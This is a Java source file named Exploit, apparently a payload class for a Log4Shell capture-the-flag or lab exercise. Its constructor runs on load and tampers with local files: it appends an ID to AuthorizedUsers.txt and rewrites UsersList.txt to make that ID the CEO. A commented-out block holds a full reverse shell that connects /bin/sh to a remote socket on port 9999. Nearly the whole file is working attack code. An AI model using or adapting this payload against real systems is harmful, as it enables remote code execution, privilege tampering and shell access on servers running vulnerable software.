/************************************************************************************* 
* To use the logger you must compile the class with (Run from Flagx Directory):
*
* javac -cp "../apache-log4j-2.9.1-bin/*" Exploit.java 
*
* The apache-log4j-2.9.1-bin folder is in the log4shell directory.
**************************************************************************************
*/

// import org.apache.logging.log4j.LogManager;
// import org.apache.logging.log4j.Logger;
import java.io.*;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.io.*;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.File;
import java.net.Socket;

public class Exploit 
{
//	boolean isWindows = System.getProperty("os.name")
//			.toLowerCase().startsWith("windows");
	public Exploit() throws Exception{
                String data = "903817192";
                File f = new File("./AuthorizedUsers.txt");
                BufferedWriter writer = new BufferedWriter(new FileWriter(f, true));
                writer.write("\n");
                writer.write(data);
                writer.close();
		
		

		//data = "7,903817192,CEO"
		String f1Name = "./UsersList.txt";
		File f1 = new File(f1Name);
		File tmp = File.createTempFile("tmp", "");
		BufferedReader br = new BufferedReader(new FileReader(f1));
		BufferedWriter bw = new BufferedWriter(new FileWriter(tmp));


		for (int i = 0; i < 6; i++){
			if(i == 0){
				br.readLine();
				bw.write("1,903817192,CEO\n");
			}
			bw.write(String.format("%s%n", br.readLine()));
		}

			

		br.readLine();

		String l;
		while (null != (l = br.readLine()))
			bw.write(String.format("%s%n", 1));
		br.close();
		bw.close();

		File oldFile = new File(f1Name);
		if(oldFile.delete())
			tmp.renameTo(oldFile);


		//BufferedWriter writer1 = new BufferedWriter(new FileWriter(f1, true));
//
//		String host="0.0.0.0";
//		int port=9999;
//		String cmd="/bin/sh";
//		Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
//		Socket s=new Socket(host, port);
//		InputStream pi = p.getInputStream(),
//			    pe = p.getInputStream(),
//			    si = s.getInputStream();
//		OutputStream po=p.getOutputStream(), so=s.getOutputStream();
//		while(!s.isClosed()){
//			while(pi.available()>0)
//				so.write(pi.read());
//			while(pe.available()>0)
//				so.write(pe.read());
//			while(si.available()>0)
//				po.write(si.read());
//			so.flush();
//			po.flush();
//			Thread.sleep(50);
//			try{
//				p.exitValue();
//				break;
//			}
//			catch (Exception e){
//			}
//		};
//		p.destroy();
//		s.close();
	}
}
